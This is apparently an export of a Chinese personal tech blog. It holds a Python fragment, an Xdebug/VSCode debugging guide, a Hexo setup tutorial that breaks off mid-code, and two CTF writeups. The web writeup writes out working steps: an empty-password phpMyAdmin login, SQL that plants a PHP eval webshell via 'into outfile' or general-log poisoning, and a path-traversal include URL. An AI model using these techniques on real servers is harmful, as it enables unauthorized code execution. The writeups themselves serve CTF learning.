metaltrain</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20191024133822154.png" alt="image-20191024133822154.png"></p><p>效果完美。</p><p>下一步直接将代码输出的list转为json文件就ok了，下课了，鸽一手。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web进阶部分writeup</title>
      <link href="/p/5a058727.html"/>
      <url>/p/5a058727.html</url>
      
        <content type="html"><![CDATA[<h1>攻防世界-web进阶-部分writeup</h1><h3 id="Web-php-include"><a class="header-anchor" href="#Web-php-include"></a>Web_php_include</h3><p>首先打开题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有文件包含，没拿到文件名，而且循环过滤，看起来绕过是不太容易。</p><a id="more"></a><p>上扫描器发现phpmyadmin：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568474211041.png" alt="1568474211041.png"></p><p>尝试空密码登录成功：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568475673813.png" alt="1568475673813.png"></p><p>有个test数据库但是是空的：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568474375962.png" alt="1568474375962.png"></p><p>于是想到两个点可以拿shell：</p><ul><li><p>通过mysql的 outfile写入shell</p></li><li><p>通过日志文件拿shell</p></li></ul><p>试下第一种：</p><p>通过phpinfo.php文件查看web目录：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568474907398.png" alt="1568474907398.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> temp; //如果存在temp就删掉</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">TABLE</span> temp(cmd <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>); //建立temp表，里面就一个cmd字段</span><br><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> temp (cmd) <span class="keyword">VALUES</span>(<span class="string">'&lt;?php eval($_POST[cmd]); ?&gt;'</span>); //把一句话木马插入到temp表</span><br><span class="line"><span class="keyword">Select</span> cmd <span class="keyword">from</span> temp <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/shell.php'</span>; //查询temp表中的一句话并把结果导入到shell.php</span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> temp; //删除temp</span><br></pre></td></tr></table></figure><p>执行第四行的时候报错：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568475721502.png" alt="1568475721502.png"></p><p>没权限，换tmp目录，然后首页包含：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568476024657.png" alt="1568476024657.png"></p><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568476050893.png" alt="1568476050893.png"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:37211&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload.php</span><br></pre></td></tr></table></figure><h3 id="phpmyadmin通过日志拿shell"><a class="header-anchor" href="#phpmyadmin通过日志拿shell"></a>phpmyadmin通过日志拿shell:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span> </span><br><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">'/tmp/log.php'</span></span><br><span class="line">select <span class="string">"&lt;?php eval($_POST[cmd])?&gt;"</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:37211&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;log.php</span><br></pre></td></tr></table></figure><p><img src="http://sz.guiu.xyz/images/2020/02/25/1568476369973.png" alt="1568476369973.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xdebug开发调试PHP</title>
      <link href="/p/1a4433a1.html"/>
      <url>/p/1a4433a1.html</url>
      
        <content type="html"><![CDATA[<h1>【VSCode插件】xdebug开发调试PHP</h1><h2 id="摘要"><a class="header-anchor" href="#摘要"></a>摘要</h2><p>Xdebug 在开发过程中可以帮我们查看具体的运行和步骤，以及每行代码执行的结果，在学习和解决代码问题的时候可以提供非常大的便利。PHPStorm 也可以进行 Xdebug 调试，VScode 也可以进行配置调试，且比 PHPStorm 的配置简单很多，不用每次去创建一个 Server，再创建一个 web page 服务。相比之下，VSCode 的界面好看，且简单方便，值得学习一下。</p><p>使用了一段时间，但是偶尔还是会出现一些问题，故而进行了整理总结。</p><a id="more"></a><h2 id="一-插件准备"><a class="header-anchor" href="#一-插件准备"></a>一.插件准备</h2><h3 id="1-查看插件列表"><a class="header-anchor" href="#1-查看插件列表"></a>1.查看插件列表</h3><p>[<a href="https://raw.githubusercontent.com/zqunor/MarkdownPic/master/vscode-debug-01.png" target="_blank" rel="noopener">avatar</a></p><h3 id="2-搜索并安装PHP-Debug-安装-VScode-时选择-PHP-开发相关的话会自动安装"><a class="header-anchor" href="#2-搜索并安装PHP-Debug-安装-VScode-时选择-PHP-开发相关的话会自动安装"></a>2.搜索并安装<code>PHP Debug</code> (安装 VScode 时选择 PHP 开发相关的话会自动安装)</h3><p><strong>PHP Debug</strong></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/y2d29qn4cj.png?imageView2/2/w/1620" alt="img"></p><h2 id="二-进行配置"><a class="header-anchor" href="#二-进行配置"></a>二.进行配置</h2><h3 id="1-给-PHP-安装-Xdebug-扩展-此处使用的是-PHPstudy-集成开发环境"><a class="header-anchor" href="#1-给-PHP-安装-Xdebug-扩展-此处使用的是-PHPstudy-集成开发环境"></a>1.给 PHP 安装 Xdebug 扩展(此处使用的是 PHPstudy 集成开发环境)</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/fq0wro8bgg.png?imageView2/2/w/1620" alt="img"></p><h3 id="2-在-php-ini-中添加相关配置"><a class="header-anchor" href="#2-在-php-ini-中添加相关配置"></a>2.在 php.ini 中添加相关配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line"># xdebug扩展的位置，phpstudy已经默认设置好</span><br><span class="line">zend_extension=<span class="string">"D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll"</span></span><br><span class="line">xdebug.auto_trace=<span class="number">1</span></span><br><span class="line">xdebug.collect_params=<span class="number">1</span></span><br><span class="line">xdebug.collect_return=<span class="number">1</span></span><br><span class="line">xdebug.trace_output_dir =<span class="string">"D\phpStudy\tmp\xdebug"</span></span><br><span class="line">xdebug.profiler_output_dir =<span class="string">"D:\phpStudy\tmp\xdebug"</span></span><br><span class="line">xdebug.profiler_output_name = <span class="string">"cachegrind.out.%t.%p"</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br><span class="line">xdebug.remote_autostart = <span class="number">1</span></span><br><span class="line">xdebug.remote_handler = <span class="string">"dbgp"</span></span><br><span class="line">xdebug.remote_host = <span class="string">"127.0.0.1"</span></span><br><span class="line"># 设置端口号，默认是9000，此处因为本地环境端口冲突故设置为9001（在vscode配置中需要用到）</span><br><span class="line">xdebug.remote_port = <span class="number">9001</span></span><br><span class="line"># 这是用于phpstorm中xdebug调试的配置，在vscode中没有用到</span><br><span class="line">xdebug.idekey = phpstorm</span><br></pre></td></tr></table></figure><h3 id="3-在-phpinfo-中查看-xdebug-扩展的信息，验证是否开启成功"><a class="header-anchor" href="#3-在-phpinfo-中查看-xdebug-扩展的信息，验证是否开启成功"></a>3.在 phpinfo 中查看 xdebug 扩展的信息，验证是否开启成功</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/x182xypldy.png?imageView2/2/w/1620" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/l197b509l4.png?imageView2/2/w/1620" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/cq4qo2rdmc.png?imageView2/2/w/1620" alt="img"></p><h3 id="4-查看-vscode-中-debug-页面"><a class="header-anchor" href="#4-查看-vscode-中-debug-页面"></a>4.查看 vscode 中 debug 页面</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/r3wcluz485.png?imageView2/2/w/1620" alt="img"></p><h3 id="5-新建-debug-配置-并选择调试语言"><a class="header-anchor" href="#5-新建-debug-配置-并选择调试语言"></a>5.新建 debug 配置,并选择调试语言</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/wxicpp71jk.png?imageView2/2/w/1620" alt="img"></p><h3 id="6-进行配置"><a class="header-anchor" href="#6-进行配置"></a>6.进行配置</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/vfo8dbbcry.png?imageView2/2/w/1620" alt="img"></p><p>相关配置信息参考：（注意 port 端口号的值，需要与 php.ini 中设置的一样）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 使用 IntelliSense 了解相关属性。</span></span><br><span class="line">  <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">  <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">  <span class="string">"configurations"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"name"</span>: <span class="string">"Listen for XDebug"</span>,</span><br><span class="line">      <span class="string">"type"</span>: <span class="string">"php"</span>,</span><br><span class="line">      <span class="string">"request"</span>: <span class="string">"launch"</span>,</span><br><span class="line">      <span class="string">"port"</span>: <span class="number">9001</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"name"</span>: <span class="string">"Launch currently open script"</span>,</span><br><span class="line">      <span class="string">"type"</span>: <span class="string">"php"</span>,</span><br><span class="line">      <span class="string">"request"</span>: <span class="string">"launch"</span>,</span><br><span class="line">      <span class="string">"program"</span>: <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">      <span class="string">"cwd"</span>: <span class="string">"$&#123;fileDirname&#125;"</span>,</span><br><span class="line">      <span class="string">"port"</span>: <span class="number">9001</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三-开启调试"><a class="header-anchor" href="#三-开启调试"></a>三.开启调试</h2><h3 id="1-启动-debug-点击绿色小箭头启动"><a class="header-anchor" href="#1-启动-debug-点击绿色小箭头启动"></a>1.启动 debug(点击绿色小箭头启动)</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/3c5klxvlbp.png?imageView2/2/w/1620" alt="img"></p><p>显示出<code>调试小窗口</code></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/xt7ins1upi.png?imageView2/2/w/1620" alt="img"></p><h3 id="2-开启自动附加-单击即可切换开关"><a class="header-anchor" href="#2-开启自动附加-单击即可切换开关"></a>2.开启自动附加(单击即可切换开关)</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/6vb6k4u76b.png?imageView2/2/w/1620" alt="img"></p><h3 id="3-设置断点-行号前点击即可出现红色小断点"><a class="header-anchor" href="#3-设置断点-行号前点击即可出现红色小断点"></a>3.设置断点(行号前点击即可出现红色小断点)</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/ddl1zj4zcz.png?imageView2/2/w/1620" alt="img"></p><h3 id="4-在浏览器中访问设置断点的程序"><a class="header-anchor" href="#4-在浏览器中访问设置断点的程序"></a>4.在浏览器中访问设置断点的程序</h3><h3 id="5-访问后会自动跳转到-VSCode，并显示出断点标记，并显示相关执行结果"><a class="header-anchor" href="#5-访问后会自动跳转到-VSCode，并显示出断点标记，并显示相关执行结果"></a>5.访问后会自动跳转到 VSCode，并显示出断点标记，并显示相关执行结果</h3><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/08pfh4c93b.png?imageView2/2/w/1620" alt="img"></p><h3 id="6-在调试小窗口中进行单步调试或单步跳过等操作"><a class="header-anchor" href="#6-在调试小窗口中进行单步调试或单步跳过等操作"></a>6.在<code>调试小窗口</code>中进行单步调试或单步跳过等操作</h3><h2 id="注意"><a class="header-anchor" href="#注意"></a>注意</h2><p>1.注意<strong>自动附加</strong>是否是开启状态</p><p>2.注意端口号是否冲突（点击下部玫红色状态栏的<code>Listen for XDebug</code>后，会弹出选择 debug 设置如果端口设置有问题的话，会在选择后弹出错误提示）</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-2737545/dy7q28gunz.png?imageView2/2/w/1620" alt="img"></p><p>(设置小图标后打开调试控制台也可以显示相关错误提示，注意查看即可)  将<code>launch.json</code>的端口号修改未被占用的号，并且修改<code>php.ini</code>中 xdebug 的配置</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
            <tag> Xdebug </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Anti_debug-writeup</title>
      <link href="/p/2198b0ee.html"/>
      <url>/p/2198b0ee.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>拿到题目后先打开看到需要我们输入超过15个字符看看。所以按照提示输入超过15个字符。按下回车后看到直接关闭了。   <img src="http://sz.guiu.xyz/images/2020/02/25/writeup1.png" alt="writeup1.PNG"></p></li><li><p>然后题目提示Anti_debug，所以应该是一道反调试的题。直接上OD动态调试。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup2.png" alt="writeup2.PNG"></p><a id="more"></a></li><li><p>按F8跟进程序到达第一个调用程序的位置，随便输入一串长度超过15的字符，看到程序停在了一个判断语句的位置。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup3.png" alt="writeup3.PNG"></p></li><li><p>继续按F8跟进程序，发现程序给出了一段关于flag的字符。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup4.png" alt="writeup4.PNG"></p></li><li><p>然后用IDA打开程序进行静态分析，IDA并没有直接找到main函数，所以需要我们手动去找。通过动态调试知道程序为了反调试调用了Windows库中的FindWindowA函数，所以直接全局搜索函数名，找到了main函数所在的位置。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup5.png" alt="writeup5.PNG"></p></li><li><p>按F5查看伪代码。发现打印字符的程序段藏在一个for循环里。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup6.png" alt="writeup6.PNG"></p></li><li><p>继续通过OD跟进程序，在程序进行两次窗口检查后遇到另一个判断语句。更改ZF标志位，让程序不跳转，继续向下执行（下方的跳转也按照相同的思路）。程序这时打印出了flag中的一部分。<img src="http://sz.guiu.xyz/images/2020/02/25/writeup7.png" alt="writeup7.PNG"></p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup8.png" alt="writeup8.PNG"></p></li><li><p>IDA中看到程序的末端调用了两个函数，查看第一个函数伪代码，发现程序调用IsDebuggerPresent函数。在OD中按F7单步跟进。根据之前的思路破坏程序的跳转，再次打印出了一部分字符串。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup9.png" alt="writeup9.PNG"></p></li><li><p>根据之前的方法跟进第二个函数，最后打印出来所有的字符串，就是完整的flag。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/writeup11.png" alt="writeup11.PNG"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速搭建Hexo</title>
      <link href="/p/b769160b.html"/>
      <url>/p/b769160b.html</url>
      
        <content type="html"><![CDATA[<h1>快速搭建</h1><p>如果你不想自己从头开始慢慢自定义主题的话，可以直接下载我的修改好的主题，然后稍微修改几个地方就好了：</p><ul><li>根目录配置文件<code>_config.yml</code>和主题目录配置文件<code>_config.yml</code>中修改个人信息。</li><li>根目录配置文件中修改<code>deploy</code>一栏的<code>repository</code>。</li><li>根目录配置文件中修改<code>baidu_url_submit</code>一栏的<code>token</code>。</li><li>主题配置文件中修改<code>gitalk</code>一栏，修改方法见正文。</li></ul><p><strong>当然前提是个性化设置章节之前的环境还是需要配置好！</strong></p><p>平时常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g  # 生成博客网页文件</span><br><span class="line">hexo s  # 本地预览博客</span><br><span class="line">hexo d  # 上传网页文件到github</span><br></pre></td></tr></table></figure><a id="more"></a><h1>安装Node.js</h1><p>首先下载稳定版<a href="https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi" target="_blank" rel="noopener">Node.js</a>，我这里给的是64位的。</p><p>安装选项全部默认，一路点击<code>Next</code>。</p><p>最后安装好之后，按<code>Win+R</code>打开命令提示符，输入<code>node -v</code>和<code>npm -v</code>，如果出现版本号，那么就安装成功了。</p><h1>添加国内镜像源</h1><p>如果没有梯子的话，可以使用阿里的国内镜像进行加速。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h1>安装Hexo</h1><p>在合适的地方新建一个文件夹，用来存放自己的博客文件，比如我的博客文件都存放在<code>D:\study\program\blog</code>目录下。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开git的控制台窗口，以后我们所有的操作都在git控制台进行，就不要用Windows自带的控制台了。</p><p>定位到该目录下，输入<code>npm i hexo-cli -g</code>安装Hexo。会有几个报错，无视它就行。</p><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>然后就要初始化我们的网站，输入<code>hexo init</code>初始化文件夹，接着输入<code>npm install</code>安装必备的组件。</p><p>这样本地的网站配置也弄好啦，输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器，然后浏览器打开http://localhost:4000/，就可以看到我们的博客啦。</p><p>按<code>ctrl+c</code>关闭本地服务器。</p><h1>写文章、发布文章</h1><p>首先在博客根目录下右键打开git bash，安装一个扩展<code>npm i hexo-deployer-git</code>。</p><p>然后输入<code>hexo new post &quot;article title&quot;</code>，新建一篇文章。</p><p>然后打开<code>D:\study\program\blog\source\_posts</code>的目录，可以发现下面多了一个文件夹和一个<code>.md</code>文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。</p><p>编写完markdown文件后，根目录下输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>可以本地预览效果，最后输入<code>hexo d</code>上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p><h2 id="文章头设置"><a class="header-anchor" href="#文章头设置"></a>文章头设置</h2><p>首先为了新建文章方便，建议将<code>/scaffolds/post.md</code>修改为如下代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">top: false</span><br><span class="line">cover: false</span><br><span class="line">password:</span><br><span class="line">toc: true</span><br><span class="line">mathjax: true</span><br><span class="line">summary:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>这样新建文章后不用你自己补充了，修改信息就行。</p><h2 id="添加404页面"><a class="header-anchor" href="#添加404页面"></a>添加404页面</h2><p>原来的主题没有404页面，加一个也不是什么难事。首先在<code>/source/</code>目录下新建一个<code>404.md</code>，内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 404</span><br><span class="line">date: 2019-07-19 16:41:10</span><br><span class="line">type: "404"</span><br><span class="line">layout: "404"</span><br><span class="line">description: "你来到了没有知识的荒原 :("</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>然后在<code>/themes/matery/layout/</code>目录下新建一个<code>404.ejs</code>文件，内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="comment">/* don't remove. */</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.about-cover</span> &#123;</span></span><br><span class="line">        height: 75vh;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bg-cover pd-header about-cover"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col s10 offset-s1 m8 offset-m2 l8 offset-l2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"brand"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title center-align"</span>&gt;</span></span><br><span class="line">                        404</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"description center-align"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">%=</span> <span class="attr">page.description</span> %&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 每天切换 banner 图.  Switch banner image every day.</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'.bg-cover'</span>).css(<span class="string">'background-image'</span>, <span class="string">'url(/medias/banner/'</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getDay() + <span class="string">'.jpg)'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="“关于”页面增加简历（可选）"><a class="header-anchor" href="#“关于”页面增加简历（可选）"></a>“关于”页面增加简历（可选）</h2><p>修改<code>/themes/matery/layout/about.ejs</code>，找到<code>&lt;div class=&quot;card&quot;&gt;</code>标签，然后找到它对应的<code>&lt;/div&gt;</code>标签，接在后面新增一个card，语句如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-content"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-content article-card-content"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title center-align"</span> <span class="attr">data-aos</span>=<span class="string">"zoom-in-up"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-address-book"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">%-</span> <span class="attr">__</span>('<span class="attr">myCV</span>') %&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"articleContent"</span> <span class="attr">data-aos</span>=<span class="string">"fade-up"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">page.content</span> %&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就会多出一张card，然后可以在<code>/source/about/index.md</code>下面写上你的简历了，当然这里的位置随你自己设置，你也可以把简历作为第一个card。</p><h2 id="解决mathjax与代码高亮的冲突"><a class="header-anchor" href="#解决mathjax与代码高亮的冲突"></a>解决mathjax与代码高亮的冲突</h2><p>如果你按照教程安装了代码高亮插件<code>hexo-prism-plugin</code>，单独使用是没有问题的，但如果你又使用了mathjax，并且按照网上教程，安装<code>kramed</code>插件并修改了js文件里的正则表达式（为了解决markdown和mathjax的语法冲突），好了，那你的代码就无法高亮了。解决方法很简单，别用<code>kramed</code>插件了，还用原来自带的<code>marked</code>插件，直接改它的正则表达式就行了，改法如下：</p><p>打开<code>D:\study\program\blog\node_modules\marked\lib\marked.js</code><br><code>escape:</code>处替换成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br></pre></td></tr></table></figure><p><code>em:</code>处替换成：</p><figure class="highlight"><table><tr><td 